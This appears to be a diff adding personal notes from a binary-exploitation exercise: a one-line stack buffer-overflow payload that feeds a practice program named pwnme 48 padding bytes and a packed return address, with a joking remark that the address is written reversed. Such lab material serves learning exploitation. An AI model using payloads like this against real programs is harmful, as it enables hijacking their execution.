@@ -1,0 +1,4 @@
+  ./pwnme $(python -c 'import struct; print "A"*48+"\xac\x84\x04\x08"')
+
+
+address ma9louba :D
